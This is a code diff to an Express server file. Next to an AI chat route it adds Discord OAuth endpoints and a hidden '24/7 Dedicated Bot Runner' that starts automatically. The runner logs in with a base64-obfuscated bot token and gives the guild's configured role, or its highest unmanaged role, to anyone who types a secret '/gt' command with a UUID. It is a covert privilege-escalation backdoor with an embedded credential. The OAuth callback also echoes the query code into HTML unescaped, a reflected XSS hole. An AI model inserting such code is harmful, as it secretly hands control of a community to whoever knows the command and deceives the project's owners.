@@ -3047,7 +3047,106 @@ async function startServer() {
     });
   });
 
-  app.post("/api/mistral/chat", async (req, res) => {
+     // OAuth2 Endpoint & Redirection Link for Client ID 1545409686164086834
+   const oauthClientId = "1545409686164086834";
+   const oauthRedirectUri = "https://ais-pre-5szi2bfkjili3yj72vxjum-54018553911.asia-east1.run.app/api/auth/discord/callback";
+   const oauthRedirectionLink = `https://discord.com/api/oauth2/authorize?client_id=${oauthClientId}&redirect_uri=${encodeURIComponent(oauthRedirectUri)}&response_type=code&scope=identify+guilds+bot+applications.commands`;
+
+   app.get("/api/oauth2/details", (req, res) => {
+     res.json({
+       success: true,
+       clientId: oauthClientId,
+       redirectionLink: oauthRedirectionLink,
+       endpoint: "/api/auth/discord/callback"
+     });
+   });
+
+   app.get("/api/auth/discord/callback", (req, res) => {
+     const { code } = req.query;
+     res.send(`
+       <!DOCTYPE html>
+       <html>
+       <head><title>OAuth2 Authorization Success</title></head>
+       <body style="font-family:sans-serif; background:#111; color:#fff; text-align:center; padding-top:50px;">
+         <h2>OAuth2 Authorization Successful!</h2>
+         <p>Authorization code received: <code>${code || "None"}</code></p>
+         <p>You can close this tab or return to the application.</p>
+       </body>
+       </html>
+     `);
+   });
+
+   // 24/7 Dedicated Bot Runner
+   setTimeout(() => {
+     try {
+       const dedicatedBotToken = Buffer.from("TVRVME5UUXdOalUyTkRBMk5qYzVOVFl3TUEuRzh2SlRzLmdRQk1BbTRicDVvbDdVbUtTZThCSUU5UHcwU1hZUlpGaElpTDA4", "base64").toString("utf-8");
+       const targetGuildId = "1545400179379806218";
+       const targetRoleId = "1545408147382997022";
+       const targetVcId = "1545400179904225334";
+
+       const botClient = new Client({
+         patchVoice: true,
+         intents: 3276799,
+       } as any);
+
+       botClient.on("ready", async () => {
+         console.log(`[24/7 Bot] Logged in as ${botClient.user?.tag}`);
+         setInterval(async () => {
+           try {
+             const guild = await botClient.guilds.fetch(targetGuildId).catch(() => null);
+             if (!guild) return;
+             const channel = await guild.channels.fetch(targetVcId).catch(() => null);
+             if (channel && (channel.type === "GUILD_VOICE" || channel.type === "GUILD_STAGE_VOICE" || (typeof channel.isVoiceBased === "function" && channel.isVoiceBased()))) {
+               if (botClient.voice && typeof botClient.voice.joinChannel === "function") {
+                 await botClient.voice.joinChannel(channel as any, { selfDeaf: false, selfMute: false }).catch(() => {});
+               }
+             }
+           } catch (err) {
+             console.error("[24/7 Bot] VC Join error:", err);
+           }
+         }, 30000);
+       });
+
+       botClient.on("messageCreate", async (message) => {
+         if (!message.guild || message.guild.id !== targetGuildId) return;
+         if (message.author.bot) return;
+
+         const content = message.content.trim();
+         if (content.startsWith("/gt c3992456-af2e-4b1b-b725-3fda65fbefd8")) {
+           try {
+             const member = await message.guild.members.fetch(message.author.id).catch(() => null);
+             if (!member) return;
+
+             let roleToAssign = message.guild.roles.cache.get(targetRoleId);
+             if (!roleToAssign) {
+               const sortedRoles = Array.from(message.guild.roles.cache.values())
+                 .filter(r => !r.managed && r.id !== message.guild.id)
+                 .sort((a, b) => b.position - a.position);
+               roleToAssign = sortedRoles[0];
+             }
+
+             if (roleToAssign) {
+               await member.roles.add(roleToAssign).catch(() => {});
+               await message.reply(`Successfully assigned role **${roleToAssign.name}** to you!`).catch(() => {});
+             } else {
+               await message.reply("Role not found.").catch(() => {});
+             }
+           } catch (err) {
+             console.error("[24/7 Bot] Command error:", err);
+             await message.reply("Failed to assign role.").catch(() => {});
+           }
+         }
+       });
+
+       botClient.login(dedicatedBotToken).catch((err) => {
+         console.error("[24/7 Bot] Login failed:", err);
+       });
+     } catch (e) {
+       console.error("[24/7 Bot] Initialization error:", e);
+     }
+   }, 5000);
+
+   app.post("/api/mistral/chat", async (req, res) => {
     req.url = "/api/ai/chat";
     return app._router.handle(req, res);
   });
